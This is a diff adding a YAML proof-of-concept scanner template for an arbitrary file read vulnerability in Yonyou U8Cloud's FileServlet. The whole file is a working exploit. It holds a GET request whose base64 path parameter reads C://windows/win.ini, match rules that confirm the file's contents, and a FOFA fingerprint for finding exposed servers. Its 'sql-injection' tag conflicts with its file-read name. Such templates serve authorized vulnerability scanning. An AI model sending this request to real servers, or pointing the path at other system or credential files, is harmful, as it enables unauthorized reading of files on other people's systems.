@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-u8cloud-fileservlet-anyfile-read
+info:
+  name: 用友U8Cloud FileServlet 任意文件读取漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: body="开启U8 cloud云端之旅"
+requests:
+- method: GET
+  path: /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ==
+  expression: 'status_code == 200 &&
+
+    contains(body,"[files]") &&
+
+    contains(body,"for 16-bit app support") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
